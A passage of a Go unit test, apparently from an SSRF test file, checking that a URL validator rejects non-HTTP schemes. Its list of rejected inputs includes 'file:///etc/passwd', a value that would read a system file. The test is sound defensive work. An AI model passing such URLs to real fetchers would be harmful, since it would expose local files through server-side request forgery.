	// file:// and the like must not be let through — http.Client's handling of
	// them is beyond the expected scope.
	bad := []string{"", "file:///etc/passwd", "ftp://example.com", "https://", "gopher://x"}
	for _, s := range bad {
		if err := validateHTTPURL(s); err == nil {
			t.Errorf("%q should be rejected", s)
		}
	}
}

FILE: notify/ssrf_test.go
